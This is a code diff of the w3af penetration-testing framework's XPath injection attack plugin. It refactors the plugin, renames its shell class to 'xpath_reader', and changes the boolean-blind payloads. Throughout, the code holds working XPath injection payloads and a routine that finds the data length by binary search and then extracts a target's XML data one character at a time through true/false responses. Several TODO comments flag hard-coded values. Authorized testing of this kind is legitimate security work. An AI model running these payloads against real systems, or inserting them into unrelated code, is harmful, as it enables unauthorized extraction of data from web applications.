@@ -32,6 +32,10 @@ from core.controllers.w3afException import w3afException
 import core.controllers.outputManager as om
 from core.data.kb.exec_shell import shell as shell
 
+ERROR_MSG = 'Empty Path Expression'
+XML_FILTER = '//*'
+
+
 
 class xpath(baseAttackPlugin):
 
@@ -49,7 +53,6 @@ class xpath(baseAttackPlugin):
         self.use_difflib = None
         self.THRESHOLD = 0.8
         self.rnum = randint(1,100)
-        self.err_msg = 'Empty Path Expression'
 
     def fastExploit( self ):
         '''
@@ -109,7 +112,7 @@ class xpath(baseAttackPlugin):
                 om.out.console( msg )
             
             # Create the shell object
-            shell_obj = xpath_shell( vuln )
+            shell_obj = xpath_reader( vuln )
             shell_obj.setUrlOpener( self._urlOpener )
             shell_obj.STR_DEL = self.STR_DEL
             shell_obj.TRUE_COND = self.TRUE_COND
@@ -137,14 +140,15 @@ class xpath(baseAttackPlugin):
             return False
         
         self.STR_DEL = delimiter
-             
-        self.TRUE_COND = "%s and %s%i%s=%s%i" % (self.STR_DEL, self.STR_DEL, 
-                                                 self.rnum, self.STR_DEL, 
-                                                 self.STR_DEL, self.rnum)
+        orig_value = vuln.getMutant().getOriginalValue()
         
-        self.FALSE_COND = "%s and %s%i%s=%s%i" % (self.STR_DEL, self.STR_DEL, 
-                                                  self.rnum, self.STR_DEL, 
-                                                  self.STR_DEL, self.rnum + 1)
+        self.TRUE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DEL, self.STR_DEL, 
+                                                   self.rnum, self.STR_DEL, 
+                                                   self.STR_DEL, self.rnum)
+        
+        self.FALSE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DEL, self.STR_DEL, 
+                                                    self.rnum, self.STR_DEL, 
+                                                    self.STR_DEL, self.rnum + 1)
         
         exploit_dc = vuln.getDc()
         functionReference = getattr( self._urlOpener , vuln.getMethod() )
@@ -153,22 +157,22 @@ class xpath(baseAttackPlugin):
         #
         #    Testing False response
         #
-        om.out.console( "Testing FALSE response..." )
+        om.out.debug( "Testing FALSE response..." )
         try:
             false_resp = functionReference( vuln.getURL(), str(exploit_dc) )
         except w3afException, e:
             return 'Error "' + str(e) + '"'
         else:
             if not self._response_is_error(vuln, false_resp.getBody()):  
-                om.out.console( "ERROR: Error message not found in FALSE response..." )
+                om.out.debug( "ERROR: Error message not found in FALSE response..." )
                 return False
             else:
-                om.out.console( "Error message found in FALSE response GOOD!" )
+                om.out.debug( "Error message found in FALSE response GOOD!" )
             #
             #    Now that we know that the FALSE response was correct, test the
             #    TRUE response.
             #
-            om.out.console( "Testing TRUE response..." )
+            om.out.debug( "Testing TRUE response..." )
             exploit_dc[ vuln.getVar() ] = self.TRUE_COND
 
             try:
@@ -178,10 +182,10 @@ class xpath(baseAttackPlugin):
             else:              
                 if self. _response_is_error(vuln, true_resp.getBody()):
                     print true_resp.getBody()
-                    om.out.console( "ERROR: Error message found in TRUE response..." )
+                    om.out.debug( "ERROR: Error message found in TRUE response..." )
                     return False
                 else:
-                    om.out.console( "Error message not found in TRUE response GOOD!" )
+                    om.out.debug( "Error message not found in TRUE response GOOD!" )
                     return True
             
     def _get_delimiter(self, vuln):
@@ -190,38 +194,39 @@ class xpath(baseAttackPlugin):
         single quote or double quote. If an error is found, None is returned.
         '''
         exploit_dc = vuln.getDc()
+        orig_value = vuln.getMutant().getOriginalValue()
         functionReference = getattr( self._urlOpener , vuln.getMethod() )
         
-        true_sq = "' and '%i'='%i" % (self.rnum, self.rnum)
-        false_sq = "' and '%i'='%i" % (self.rnum, self.rnum + 1) 
-        true_dq = '" and "%i"="%i' % (self.rnum, self.rnum) 
+        true_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum)
+        false_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum + 1) 
+        true_dq = '%s" and "%i"="%i' % (orig_value, self.rnum, self.rnum) 
         
-        om.out.console( "Trying to determine string delimiter" )
-        om.out.console(  "Testing Single Quote... (')" )
+        om.out.debug( "Trying to determine string delimiter" )
+        om.out.debug(  "Testing single quote... (')" )
         exploit_dc[ vuln.getVar() ] = true_sq
         try:
             sq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
         except w3afException, e:
-            om.out.console( 'Error "' + str(e) + '"' )
+            om.out.debug( 'Error "' + str(e) + '"' )
             return None
         else:
             if self._response_is_error(vuln, sq_resp.getBody()):
                 # If we found ERROR with TRUE Query, we have a problem!
-                om.out.console( 'Single Quote TRUE test failed, testing Double quote' )
+                om.out.debug( 'Single quote TRUE test failed, testing double quote' )
                 exploit_dc[ vuln.getVar() ] = true_dq
                 try:
                     dq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
                 except w3afException, e:
-                    om.out.console( 'Error "' + str(e) + '"' )
+                    om.out.debug( 'Error "' + str(e) + '"' )
                     return None
                 else:
                     if self._response_is_error(vuln, dq_resp.getBody()):
                         # If we found an error HERE, the TWO tests were ERROR, 
                         # Houston we have a BIG PROBLEM! 
-                        om.out.console( 'The TWO string delimiter tests failed, stopping.' )
+                        om.out.debug( 'The TWO string delimiter tests failed, stopping.' )
                         return None
                     else:
-                        om.out.console( 'String delimiter found! It is (")!' )
+                        om.out.debug( 'String delimiter found! It is (")!' )
                         return '"'
             else:
                 # If true query was single-quote, test false query.
@@ -229,16 +234,17 @@ class xpath(baseAttackPlugin):
                 try:
                     sq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
                 except w3afException, e:
-                    om.out.console( 'Error "' + str(e) + '"' )
+                    om.out.debug( 'Error "' + str(e) + '"' )
                     return None
                 else:
                     if self._response_is_error(vuln, sq_resp.getBody()):
-                        om.out.console( 'String delimiter FOUND, It is (\')!' )
+                        om.out.debug( 'String delimiter FOUND, it is (\')!' )
                         return "'"
                     else:
-                        om.out.console( 'The TWO string delimiter tests failed, stopping.' )
+                        om.out.debug( 'The TWO string delimiter tests failed, stopping.' )
                         return None         
-                            
+    
+    #TODO: This is duplicated code                 
     def _response_is_error(self, vuln, res_body):
         '''
         This functions checks which method must be used to check Responses
@@ -263,7 +269,7 @@ class xpath(baseAttackPlugin):
                 else:
                     return False
         else:
-            if re.search(self.err_msg, res_body, re.IGNORECASE):
+            if re.search(ERROR_MSG, res_body, re.IGNORECASE):
                 return True
             else:
                 return False
@@ -282,7 +288,7 @@ class xpath(baseAttackPlugin):
         functionReference = getattr( self._urlOpener , vuln.getMethod() )
         exploit_dc[ vuln.getVar() ] = vuln.getMutant().getOriginalValue()
 
-        om.out.console( "Testing if body dynamically changes... " )
+        om.out.debug( "Testing if body dynamically changes... " )
         try:
             base_res = functionReference( vuln.getURL(), str(exploit_dc) )
             
@@ -292,18 +298,18 @@ class xpath(baseAttackPlugin):
                                                     req_x.getBody()).ratio()
                                                                          
         except w3afException, e:
-            om.out.console( 'Error "' + str(e) + '"' )
+            om.out.debug( 'Error "' + str(e) + '"' )
         else:
-            om.out.console( 'Test finished!' )
+            om.out.debug( 'Test finished!' )
             
             if (diffRatio / count) > self.THRESHOLD:
-                om.out.console( 'It is possible use difflib for identifying the error response' )
+                om.out.debug( 'It is possible use difflib for identifying the error response' )
                 return True
             else:
-                om.out.console( 'Randomness is too high to use difflib, switching to error based detection...' )
+                om.out.debug( 'Randomness is too high to use difflib, switching to error based detection...' )
                 return False
         
-class xpath_shell(shell):
+class xpath_reader(shell):
 
     def __init__(self, v):
         shell.__init__(self, v)
@@ -315,8 +321,12 @@ class xpath_shell(shell):
         self.id = 0
         
         # TODO: Review these HARD-CODED constants
-        self.xml_cmd = '//*'
-        self.max_data_len = 10000 
+        self.max_data_len = 10000
+    
+    def __repr__(self):
+        return '<'+self.getName()+' object)>'
+    
+    __str__ = __repr__
 
     def help( self, command ):
         '''
@@ -361,7 +371,7 @@ class xpath_shell(shell):
             try:
                 data = self.get_data(data_len)
             except w3afException:
-                om.out.console( 'Error found during data extration: "%s"' % w3afException )
+                om.out.debug( 'Error found during data extration: "%s"' % w3afException )
                 return ''
             else:
                 return data
@@ -377,38 +387,42 @@ class xpath_shell(shell):
         maxl = self.max_data_len
         minl = 1
         
-        om.out.console("Finding XML data length...")
+        om.out.debug("Finding XML data length...")
         
         fdata_len = False
         while not fdata_len:
             
             mid = (maxl + minl) / 2
-            om.out.console( "MAX:%i, MID:%i, MIN:%i" % (maxl, mid, minl) )
-            findlen = "%sand string-length(%s)=%i %s" % (self.STR_DEL,
-                                                         self.xml_cmd, 
-                                                         mid, self.TRUE_COND[1:])
+            om.out.debug( "MAX:%i, MID:%i, MIN:%i" % (maxl, mid, minl) )
+            #TODO: I'm missing the original value. See the 1 at the string start
+            #TODO: Find a better solution for self.TRUE_COND[3:]
+            findlen = "1%s and string-length(%s)=%i %s" % (self.STR_DEL,
+                                                          XML_FILTER, 
+                                                          mid, self.TRUE_COND[3:])
             exploit_dc[ self.getVar() ] = findlen
             
             try:    
                 lresp = functionReference( self.getURL(), str(exploit_dc) )
             except w3afException, e:
-                om.out.console( 'Error "' + str(e) + '"' )
+                om.out.debug( 'Error "' + str(e) + '"' )
             else:
-                if not self. _response_is_error(self, lresp.getBody()):
+                if not self._response_is_error(self, lresp.getBody()):
                     # We found the length!
                     fdata_len = True
-                    om.out.console('Response Length FOUND!: %i ' % (mid) )
+                    om.out.debug('Response Length FOUND!: %i ' % (mid) )
                     return mid
                 
                 else:
-                    findlen = "%sand string-length(%s)<%i %s" % (self.STR_DEL,
-                                                                 self.xml_cmd, 
-                                                                 mid , self.TRUE_COND[1:])
+                    #TODO: I'm missing the original value. See the 1 at the string start
+                    #TODO: Find a better solution for self.TRUE_COND[3:]
+                    findlen = "1%s and string-length(%s)<%i %s" % (self.STR_DEL,
+                                                                 XML_FILTER, 
+                                                                 mid , self.TRUE_COND[3:])
                     try:
                         exploit_dc[ self.getVar() ] = findlen
                         lresp = functionReference( self.getURL(), str(exploit_dc) )
                     except w3afException, e:
-                        om.out.console( 'Error "' + str(e) + '"')
+                        om.out.debug( 'Error "' + str(e) + '"')
                         return None
                     else:
                         if not self._response_is_error(self, lresp.getBody()):
@@ -435,23 +449,56 @@ class xpath_shell(shell):
         
         for pos in range(ldata):
             for c in range(32,127):
+
+                #TODO: I'm missing the original value. See the 1 at the string start
+                #TODO: Find a better solution for self.TRUE_COND[3:]
                 
                 hexcar = '%' + hex(c)[2:]
-                dataq = '%s and substring(%s,%i,1)="%s" %s' % (self.STR_DEL,
-                                                               self.xml_cmd, 
+                dataq = '1%s and substring(%s,%i,1)="%s" %s' % (self.STR_DEL,
+                                                               XML_FILTER, 
                                                                pos, hexcar, 
-                                                               self.TRUE_COND[1:])
+                                                               self.TRUE_COND[3:])
                 exploit_dc[ self.getVar() ] = dataq
                 dresp = functionReference( self.getURL(), str(exploit_dc) )
                 
                 if not self._response_is_error(self, dresp.getBody()):
+                    om.out.console('Character found: %s' % c)
                     data += chr(c)
                     
         return data
             
     def end( self ):
-        om.out.debug('xpath_shell cleanup complete.')
+        om.out.debug('xpath_reader cleanup complete.')
         
     def getName( self ):
-        return 'xpath_shell'
+        return 'xpath_reader'
         
+    #TODO: This is duplicated code                 
+    def _response_is_error(self, vuln, res_body):
+        '''
+        This functions checks which method must be used to check Responses
+        
+        @return: True if the res_body is ERROR and FALSE if Not
+        '''
+        exploit_dc = vuln.getDc()
+        functionReference = getattr( self._urlOpener , vuln.getMethod() )
+        exploit_dc[ vuln.getVar() ] = '1'#TODO: vuln.getMutant().getOriginalValue()
+
+        if self.use_difflib:
+            # TODO: Perform this request only once
+            try:     
+                baseReq = functionReference( vuln.getURL(), str(exploit_dc) )
+            except w3afException, e:
+                # TODO: FIX this return
+                return 'Error "' + str(e) + '"'
+            else:
+                if difflib.SequenceMatcher(None, baseReq.getBody(), 
+                                           res_body).ratio() < self.THRESHOLD :
+                    return True
+                else:
+                    return False
+        else:
+            if re.search(ERROR_MSG, res_body, re.IGNORECASE):
+                return True
+            else:
+                return False
